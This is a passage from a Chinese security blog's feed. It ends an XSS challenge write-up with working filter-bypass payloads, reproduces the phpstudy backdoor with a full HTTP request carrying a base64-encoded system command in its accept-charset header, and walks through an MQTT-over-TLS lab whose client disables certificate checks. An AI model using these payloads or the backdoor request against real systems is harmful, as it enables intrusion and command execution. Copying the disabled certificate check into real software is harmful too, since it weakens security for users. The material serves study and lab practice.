alt="uJQ029.png"></p><p>可以看到onclick也被过滤，但是可以看到尖括号没有被过滤</p><p>所以可以构造a标签，再尝试利用a标签的href属性执行javascript:伪协议，<code>&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;</code>，没有对javascript进行过滤，触发xss</p><p><img src="https://s2.ax1x.com/2019/09/30/uJ8gOA.png" alt="uJ8gOA.png"></p><h3 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h3><p>输入<code>&quot;&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code>测试，<code>&lt;script&gt;</code>标签被过滤</p><p><img src="https://s2.ax1x.com/2019/09/30/uJ8bOs.png" alt="uJ8bOs.png"></p><p>输入<code>&quot; onclick=alert(1)//</code>测试，onclick被过滤</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\1569811007499.png" alt="1569811007499"></p><p>输入<code>&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;</code>测试。发现href也被过滤</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\1569811096641.png" alt="1569811096641"></p><p>尝试是用大小写绕过</p><p>payload：<code>&quot;&gt;&lt;a HREF=&quot; javascript:alert(1)&quot;</code></p><p>或者<code>&quot;&gt; &lt;Script&gt;alert(&#39;123&#39;)&lt;/script&gt; //</code></p><p><img src="https://s2.ax1x.com/2019/09/30/uJYfT1.png" alt="uJYfT1.png"></p><h3 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h3><p>按照前面的套路试了一遍，发现script、on、href都被过滤，大小写都被过滤</p><p>使用双写单词来绕过</p><p>payload1：<code>&quot; oonnclick=alert(1)//</code></p><p>payload：<code>&quot;&gt;&lt;a hrhrefef=&quot; javascscriptript:alert(1)&quot;</code></p><p><img src="https://s2.ax1x.com/2019/09/30/uJBPPA.png" alt="uJBPPA.png"></p><p><img src="https://s2.ax1x.com/2019/09/30/uJBvzq.png" alt="uJBvzq.png"></p><h3 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h3><p>随便输了一个试试，查看源码</p><p><img src="https://s2.ax1x.com/2019/09/30/uYdiSx.png" alt="uYdiSx.png"></p><p>发现原本就有一个href标签，所以直接添加javascript:alert(1)即可，可是会发现script被过滤了，转换大小写也不行，</p><p><img src="https://s2.ax1x.com/2019/09/30/uYsout.png" alt="uYsout.png"></p><p>可以发现还有一处调用的字符串里面没有使用这样的函数去进行防护，可以利用这一点下功夫，尝试编码绕过，进行<a href="https://www.qqxiuzi.cn/bianma/zifushiti.php">html编码</a>之后可以成功饶过，</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&amp;#x6A;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x76;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x69;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x3A;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x6C;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x28;</span><span class="symbol">&amp;#x31;</span><span class="symbol">&amp;#x29;</span></span><br></pre></td></tr></table></figure><p>（其实这里编码的话只编码script其中一个字符就可以）</p><p><img src="https://s2.ax1x.com/2019/09/30/uYd4c6.png" alt="uYd4c6.png"></p><h3 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h3><p>输入javascript:alert(1)测试一下</p><p><img src="https://s2.ax1x.com/2019/09/30/uY0PsK.png" alt="uY0PsK.png"></p><p>发现这次的输入没有在href标签那里，所以，再试试<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p><p><img src="https://s2.ax1x.com/2019/09/30/uY06Y9.png" alt="uY06Y9.png"></p><p>尖括号和引号都被过滤，看来害的编码</p><p>使用上一关的poc试试，也不行，，，只能看看源码</p><p><img src="https://s2.ax1x.com/2019/09/30/uYyAC4.png" alt="uYyAC4.png"></p><p>发现这里对url进行了限制，必须包含<strong>http://</strong></p><p>尝试构造<code>javascr&amp;#x69;pt:alert(1)http://</code>，居然不对、、、</p><p><img src="https://s2.ax1x.com/2019/09/30/uYc5v9.png" alt="uYc5v9.png"></p><p>确实不对，那该怎么办呢，两</p><p>个解决办法：注释或者把http://放到aler()里面</p><p><code>javascr&amp;#x69;pt:alert(1)//http://</code></p><p><code>javascr&amp;#x69;pt:alert(&amp;#x22;http://&amp;#x22;)</code>这里吧引号编码</p><p><img src="https://s2.ax1x.com/2019/09/30/uYcR4U.png" alt="uYcR4U.png"></p><h3 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h3><p>明面上没有看到输入框，但是url栏里可以输入</p><p><img src="https://s2.ax1x.com/2019/09/30/uYgqLn.png" alt="uYgqLn.png"></p><p><img src="https://s2.ax1x.com/2019/09/30/uY2vnA.png" alt="uY2vnA.png"></p><p>发现尖括号被过滤，但是这里有三个隐藏的参数，不明白，看看源码</p><p><img src="https://s2.ax1x.com/2019/09/30/uY2O6H.png" alt="uY2O6H.png"></p><p>keyword被htmlspecialchars过滤，但是还有一个参数t_sort没有防护，只是过滤了尖括号，然后放到了一个input标签中隐藏起来</p><p>可以闭合双引号，使用<code>onclick</code>事件，然后把隐藏的标签用<code>text</code>方式回显出来即可，最后的payload</p><p><code>t_sort=&quot; onclick=alert(1) type=&quot;text&quot;</code></p><p><img src="https://s2.ax1x.com/2019/09/30/uYh9tx.png" alt="uYh9tx.png"></p><h3 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h3>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;xss小游戏&lt;/p&gt;
&lt;h3 id=&quot;level1&quot;&gt;&lt;a href=&quot;#level1&quot; class=&quot;headerlink&quot; title=&quot;level1&quot;&gt;&lt;/a&gt;level1&lt;/h3&gt;&lt;p&gt;看了看level1的源码</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
    <category term="XSS" scheme="http://example.com/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>phpstudy漏洞复现</title>
    <link href="http://example.com/2019/09/27/%E5%A4%A7%E5%AD%A6CTF/phpstudy%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://example.com/2019/09/27/%E5%A4%A7%E5%AD%A6CTF/phpstudy%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2019-09-27T07:59:30.000Z</published>
    <updated>2019-10-16T08:03:56.126Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在玩手机的时候，发现微信推了一篇文章，案件背景如下：</p><p>2018年12月4日，西湖区公安分局网警大队接报案，某公司发现公司内有20余台计算机被执行危险命令<span id="more"></span>，疑似远程控制抓取账号密码等计算机数据回传大量敏感信息。通过专业技术溯源进行分析，查明了数据回传的信息种类、原理方法、存储位置，并聘请了第三方鉴定机构对软件中的“后门”进行司法鉴定，鉴定结果是该“后门”文件具有控制计算机的功能，嫌疑人已通过该后门远程控制下载运行脚本实现收集用户个人信息。在2019年9月20日，网上爆出phpstudy存在“后门”。作者随后发布了声明。<br>于是想起自己安装过phpstudy软件，赶紧查一下是否存在后门文件，结果一看真存在后门，学个PHP真是不容易，软件被别人偷偷安装了后门。</p><p>phpstudy是一款PHP调试环境的程序集成包，集成了最新的Apache、PHP、phpMyAdmin、ZendOptimizer等多款软件一次性安装，无需配置，即装即用。由于其免费且方便的特性，在国内有着近百万的PHP语言学习者、开发者用户。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><blockquote><p>phpstudy 2016版php-5.4</p><p>phpstudy 2018版php-5.2.17</p><p>phpstudy 2018版php-5.4.45</p></blockquote><h3 id="后门检测"><a href="#后门检测" class="headerlink" title="后门检测"></a>后门检测</h3><p>作为学生党，我也一直在用phpstudy，所以要看看是不是自己的phpstudy也存在这个后门。</p><h4 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h4><p>看了一些文章之后，发现这个后门是在phpstudy 2018版php-5.2.17和phpstudy 2018版php-5.4.45的\ext\php_xmlrpc.dll，</p><p><img src="https://s2.ax1x.com/2019/09/27/uKBngJ.png" alt="uKBngJ.png"></p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\1569572216340.png" alt="1569572216340"></p><p>打开这两个文件，ctrl+F搜索一下，看看有没有<strong>eval</strong>，文件存在@eval(%s(‘%s’))证明漏洞存在，</p><p>结果，，，</p><p><img src="https://s2.ax1x.com/2019/09/27/uKBWKs.png" alt="uKBWKs.png"></p><p>显然，我的phpstudy存在后门，也可以利用MD5值检测是不是存在后门。</p><p><strong>后门文件MD5值：</strong><br>MD5: 0F7AD38E7A9857523DFBCE4BCE43A9E9<br>MD5: C339482FD2B233FB0A555B629C0EA5D5</p><p>后门的原理我不懂 。。。但是也看到了几篇文章，以后可以看看。</p><p><a href="http://www.52bug.cn/hkjs/6100.html">http://www.52bug.cn/hkjs/6100.html</a></p><p><a href="https://mp.weixin.qq.com/s/dIDfgFxHlqenKRUSW7Oqkw">https://mp.weixin.qq.com/s/dIDfgFxHlqenKRUSW7Oqkw</a></p><h3 id="后门利用"><a href="#后门利用" class="headerlink" title="后门利用"></a>后门利用</h3><p>这里是大佬的后门包</p><blockquote><p>GET /test/2.php HTTP/1.1<br>Host: 127.0.0.1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip,deflate<br>accept-charset: (这里是你要执行的命令的base64加密值)ZWNobyBzeXN0ZW0oIm5ldCB1c2VyIik7<br>Connection: close<br>Cookie: _ga=GA1.1.994769775.1540538530; security_level=0<br>Upgrade-Insecure-Requests: 1<br>Cache-Control: max-age=0</p></blockquote><p>**accept-charset: **字段要写要执行命令的base64值</p><p>在本地随便写个PHP文件，把phpstudy的版本切换到5.4.45或者5.2.17，用bp抓包，</p><p><img src="https://s2.ax1x.com/2019/09/27/uKy2F0.png" alt="uKy2F0.png"></p><p>然后添加，</p><blockquote><p>accept-charset: ZWNobyBzeXN0ZW0oIm5ldCB1c2VyIik7</p></blockquote><p>ZWNobyBzeXN0ZW0oIm5ldCB1c2VyIik7是echo system(“net user”);的base64值，</p><p><img src="https://s2.ax1x.com/2019/09/27/uK6LHs.png" alt="uK6LHs.png"></p><p>即可得到当前用户，</p><p>在这里的时候，出现一个问题，</p><p><img src="https://s2.ax1x.com/2019/09/27/uKcAER.png" alt="uKcAER.png"></p><p>gzip和deflate之间有一个空格，有空格的时候，会导致无法利用这个后门，要把这个空格删掉才行。</p><p><a href="https://www.cnblogs.com/-qing-/p/11575622.html">phpstudy后门rce批量利用脚本</a></p><p>参考文章</p><p><a href="https://www.cnblogs.com/yuzly/p/11565997.html">https://www.cnblogs.com/yuzly/p/11565997.html</a></p><p><a href="https://blog.csdn.net/weixin_43886632/article/details/101294081">https://blog.csdn.net/weixin_43886632/article/details/101294081</a></p><p><a href="https://www.cnblogs.com/-qing-/p/11575622.html">https://www.cnblogs.com/-qing-/p/11575622.html</a></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;在玩手机的时候，发现微信推了一篇文章，案件背景如下：&lt;/p&gt;
&lt;p&gt;2018年12月4日，西湖区公安分局网警大队接报案，某公司发现公司内有20余台计算机被执行危险命令</summary>
    
    
    
    <category term="Sec" scheme="http://example.com/categories/Sec/"/>
    
    
    <category term="Security" scheme="http://example.com/tags/Security/"/>
    
    <category term="后门" scheme="http://example.com/tags/%E5%90%8E%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>MQTT之TLS</title>
    <link href="http://example.com/2019/06/30/%E7%BC%96%E7%A8%8B/MQTT%E4%B9%8BTLS/"/>
    <id>http://example.com/2019/06/30/%E7%BC%96%E7%A8%8B/MQTT%E4%B9%8BTLS/</id>
    <published>2019-06-30T06:47:59.000Z</published>
    <updated>2021-05-23T07:31:14.826Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>做了很久的实验，一直没能成功，最后还是down的大佬的源码，侵删。<span id="more"></span></p><h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a><strong>简介</strong></h4><p>MQTT协议是物联网应用中重要的应用层协议，上一次实验开展了MQTT协议的分析，对MQTT协议的长连接机制、发布/订阅工作模式交互机制进行了分析。但如果MQTT协议不进行安全实现，黑客可以恶意发布信息给服务器，特别是在工业、交通等物联网应用场合后果不堪设想。本实验旨构建MQTT协议安全通信。</p><h4 id="要求"><a href="#要求" class="headerlink" title="要求"></a><strong>要求</strong></h4><p>（1）掌握MQTT的安全通信的基本原理。</p><p>（2）设计MQTT安全通信的安全措施。</p><p>（3）实现基于TLS的MQTT通信。</p><h4 id="基本步骤"><a href="#基本步骤" class="headerlink" title="基本步骤"></a><strong>基本步骤</strong></h4><p>（1）应用层：MQTT协议提供了客户标识以及用户名密码，以便验证设备。基于ACL对主题的订阅和发布权限设置基本的授权。</p><p>（2）传输层：传输层可使用TLS加密、验证证书机制，防止中间人攻击。</p><p>（3）网络层：可以通过专线或者使用VPN来连接设备与MQTT代理，以提高网络传输的安全性。可以通过防火墙保护MQTT代理端，比如限制端口、限制协议、限制IP段。</p><p>   注意构建一个局域网，模拟MQTT服务端（代理端）、客户端（分订阅和发布），运用Wireshark抓包分析安全通信过程。</p><p><img src="https://s2.ax1x.com/2019/06/30/Z1QfoT.png" alt="Z1QfoT.png"></p><h4 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h4><p><strong>服务器</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mosca = <span class="built_in">require</span>(<span class="string">&#x27;mosca&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> SECURE_KEY = __dirname + <span class="string">&#x27;/tls-key.pem&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> SECURE_CERT = __dirname + <span class="string">&#x27;/tls-cert.pem&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> settings = &#123;</span><br><span class="line">  <span class="attr">logger</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;secureExample&quot;</span>,</span><br><span class="line">    <span class="attr">level</span>: <span class="number">40</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">secure</span> : &#123; </span><br><span class="line">    <span class="attr">port</span>: <span class="number">9090</span>,</span><br><span class="line">    <span class="attr">keyPath</span>: SECURE_KEY,</span><br><span class="line">    <span class="attr">certPath</span>: SECURE_CERT,</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> server = <span class="keyword">new</span> mosca.Server(settings);</span><br><span class="line">server.on(<span class="string">&#x27;published&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">packet, client</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//当客户端有连接发布主题消息</span></span><br><span class="line">    <span class="keyword">var</span> topic = packet.topic;</span><br><span class="line">    <span class="built_in">console</span>.log(packet);</span><br><span class="line">    <span class="keyword">switch</span> (topic) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;test&#x27;</span>:</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&#x27;收到消息：&#x27;</span>, packet.payload.toString());</span><br><span class="line">            <span class="comment">//MQTT转发主题消息</span></span><br><span class="line">            <span class="comment">//MqttServer.publish(&#123; topic: &#x27;other&#x27;, payload: &#x27;sssss&#x27; &#125;);</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;other&#x27;</span>:</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&#x27;message-123&#x27;</span>, packet.payload.toString());</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">server.on(<span class="string">&#x27;ready&#x27;</span>, setup);</span><br><span class="line"><span class="comment">//若用户名与密码有效，接受链接</span></span><br><span class="line"><span class="keyword">var</span> authenticate = <span class="function"><span class="keyword">function</span>(<span class="params">client, username, password, callback</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> authorized = (username === <span class="string">&#x27;alice&#x27;</span> &amp;&amp; password.toString() === <span class="string">&#x27;secret&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> (authorized) &#123;</span><br><span class="line">      client.user = username;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">&#x27;通过认证登录的用户：&#x27;</span>, username);</span><br><span class="line">  &#125;</span><br><span class="line">  callback(<span class="literal">null</span>, authorized);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 授权为alice的客户端可以发布/users/alice，</span></span><br><span class="line"><span class="comment">// 从主题中取得用户名，并校验与授权用户一致</span></span><br><span class="line"><span class="keyword">var</span> authorizePublish = <span class="function"><span class="keyword">function</span>(<span class="params">client, topic, payload, callback</span>) </span>&#123;</span><br><span class="line">  callback(<span class="literal">null</span>, client.user == topic);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 授权为alice的客户端可以订阅/users/alice，</span></span><br><span class="line"><span class="comment">// 从主题中取得用户名，并校验与授权用户一致</span></span><br><span class="line"><span class="keyword">var</span> authorizeSubscribe = <span class="function"><span class="keyword">function</span>(<span class="params">client, topic, callback</span>) </span>&#123;</span><br><span class="line">  callback(<span class="literal">null</span>, client.user == topic);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//mosca配置</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;Mosca secure server is up and running&#x27;</span>)</span><br><span class="line">  server.authenticate = authenticate;</span><br><span class="line">  server.authorizePublish = authorizePublish;</span><br><span class="line">  server.authorizeSubscribe = authorizeSubscribe;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/06/30/Z1lg9e.png" alt="Z1lg9e.png"></p><p>订阅方**</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mqtt = <span class="built_in">require</span>(<span class="string">&#x27;mqtt&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> KEY = fs.readFileSync(path.join(__dirname, <span class="string">&#x27;/tls-key.pem&#x27;</span>))</span><br><span class="line"><span class="keyword">var</span> CERT = fs.readFileSync(path.join(__dirname, <span class="string">&#x27;/tls-cert.pem&#x27;</span>))</span><br><span class="line"><span class="keyword">var</span> TRUSTED_CA_LIST = fs.readFileSync(path.join(__dirname, <span class="string">&#x27;/crt.ca.cg.pem&#x27;</span>))</span><br><span class="line"><span class="keyword">var</span> PORT = <span class="number">9090</span></span><br><span class="line"><span class="keyword">var</span> HOST = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"><span class="keyword">var</span> options = &#123;</span><br><span class="line">  <span class="attr">port</span>: PORT,</span><br><span class="line">  <span class="attr">host</span>: HOST,</span><br><span class="line">  <span class="attr">key</span>: KEY,</span><br><span class="line">  <span class="attr">cert</span>: CERT,</span><br><span class="line">  <span class="attr">rejectUnauthorized</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">ca</span>: TRUSTED_CA_LIST,</span><br><span class="line">  <span class="attr">protocol</span>: <span class="string">&#x27;mqtts&#x27;</span>,</span><br><span class="line">  <span class="comment">//订阅者实现认证的参数</span></span><br><span class="line">  <span class="attr">username</span>:<span class="string">&quot;alice&quot;</span>,</span><br><span class="line">  <span class="attr">password</span>:<span class="string">&quot;secret&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> client2 = mqtt.connect(options)</span><br><span class="line">client2.subscribe(<span class="string">&#x27;alice&#x27;</span>,&#123;<span class="attr">qos</span>:<span class="number">0</span>&#125;);<span class="comment">//订阅主题为alice的消息  </span></span><br><span class="line">client2.on(<span class="string">&#x27;message&#x27;</span>,<span class="function"><span class="keyword">function</span>(<span class="params">top,message</span>) </span>&#123;  </span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;收到消息：&#x27;</span>, message.toString());  </span><br><span class="line">&#125;); </span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/06/30/Z1lxH0.png" alt="Z1lxH0.png"></p><p>发布方**</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mqtt = <span class="built_in">require</span>(<span class="string">&#x27;mqtt&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> KEY = fs.readFileSync(path.join(__dirname, <span class="string">&#x27;/tls-key.pem&#x27;</span>))</span><br><span class="line"><span class="keyword">var</span> CERT = fs.readFileSync(path.join(__dirname, <span class="string">&#x27;/tls-cert.pem&#x27;</span>))</span><br><span class="line"><span class="keyword">var</span> TRUSTED_CA_LIST = fs.readFileSync(path.join(__dirname, <span class="string">&#x27;/crt.ca.cg.pem&#x27;</span>))</span><br><span class="line"><span class="keyword">var</span> PORT = <span class="number">9090</span></span><br><span class="line"><span class="keyword">var</span> HOST = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"><span class="keyword">var</span> options = &#123;</span><br><span class="line">  <span class="attr">port</span>: PORT,</span><br><span class="line">  <span class="attr">host</span>: HOST,</span><br><span class="line">  <span class="attr">key</span>: KEY,</span><br><span class="line">  <span class="attr">cert</span>: CERT,</span><br><span class="line">  <span class="attr">rejectUnauthorized</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">ca</span>: TRUSTED_CA_LIST,</span><br><span class="line">  <span class="attr">protocol</span>: <span class="string">&#x27;mqtts&#x27;</span>,</span><br><span class="line">  <span class="comment">//发布者实现认证的参数</span></span><br><span class="line">  <span class="attr">username</span>:<span class="string">&quot;alice&quot;</span>,</span><br><span class="line">  <span class="attr">password</span>:<span class="string">&quot;secret&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> client = mqtt.connect(options)</span><br><span class="line"><span class="keyword">var</span> num = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> qtt = &#123;&#125;; <span class="comment">//定义消息</span></span><br><span class="line">qtt = <span class="string">&#x27;hello world&#x27;</span>;</span><br><span class="line"><span class="comment">//一秒钟发送一次消息setr=xxxxxxx1xx</span></span><br><span class="line"><span class="built_in">setInterval</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    client.publish(<span class="string">&#x27;alice&#x27;</span>, qtt, &#123; <span class="attr">qos</span>: <span class="number">0</span>, <span class="attr">retain</span>: <span class="literal">true</span> &#125;);  </span><br><span class="line">&#125;, <span class="number">10000</span>);</span><br></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/Z11PCF"><img src="https://s2.ax1x.com/2019/06/30/Z11PCF.png" alt="Z11PCF.png"></a></p><p><strong>抓包分析</strong></p><p><img src="https://s2.ax1x.com/2019/06/30/Z11VD1.png" alt="Z11VD1.png"></p><p><strong>1</strong> <strong>客户端发出请求（ClientHello)</strong></p><p><img src="https://s2.ax1x.com/2019/06/30/Z111vd.png" alt="Z111vd.png"></p><p>(1) 客户端与服务端通过tcp三次握手建立tcp连接后，客户端首先向服务器发出建立加密通信的请求，发送ClientHello请求，从消息体结构看，tls/ssl是基于tcp连接之上，应用层之下的协议。</p><p><strong>2</strong> <strong>服务器响应（SeverHello）</strong></p><p><img src="https://s2.ax1x.com/2019/06/30/Z11WPU.png" alt="Z11WPU.png"></p><p><img src="https://s2.ax1x.com/2019/06/30/Z11fGF.png" alt="Z11fGF.png"></p><p>服务器收到客户端请求后，向客户端发出响应，叫做Sever Hello。</p><p>从消息体中，可以看到服务器的响应包含以下内容：</p><p>(1) 确认使用的加密通信协议版本，这里确认使用tls1.2，而不是client hello中的tls1.1。响应握手协议消息 server hello。如果浏览器与服务器支持的版本不一致，服务器关闭加密通信。</p><p>(2) 一个服务器生成的随机数，稍后用于生成”对话密钥”。</p><p>(3) 确认使用的加密套件,这里为rsa+aes128+sha256</p><p>(4) 压缩方法为空。</p><p>(5) 一些列扩展信息</p><p><strong>3 服务端发送服务端电子证书（CA），密钥交换（server key exchange），及server hello done三个握手消息</strong></p><p><img src="https://s2.ax1x.com/2019/06/30/Z13pqI.png" alt="Z13pqI.png"></p><p>客户端接收到server hello握手消息后，及时反馈ack消息。服务端接收客户端ack消息后，发送服务端电子证书，密钥交换，及server hello done三个握手消息</p><p>从封装内容看，包含两层ssl协议体信息，头一个为服务端证书，后面跟着公共密钥交换和hello done消息体，具体如下：</p><p>（1）详细的电子证书信息和CA认证机构信息</p><p>（2）密钥交换信息，包括DH算法计算出的pubkey公钥，电子签名的hash算法值</p><p>（3）server hello done消息体</p><p><strong>4 客户端发送密钥交换信息（client key exchange）、编码改变协议消息(change cipher spec)</strong></p><p><img src="https://s2.ax1x.com/2019/06/30/Z13mss.png" alt="Z13mss.png"></p><p>客户端发送ack消息给服务端，确认收到server hello done消息，然后发送客户端的密钥交换信息和修改密钥的协议消息</p><p>主要内容如下：</p><p>(1) 发送DH算法计算的pubkey，用于服务端计算生成解密私钥</p><p>(2) 发送编码改变通知，表示随后的信息都将用双方商定的加密方法和密钥发送。</p><p>(3) 发送加密后的握手消息，一个随机数。该随机数用服务器公钥加密，防止被窃听</p><p>(4) 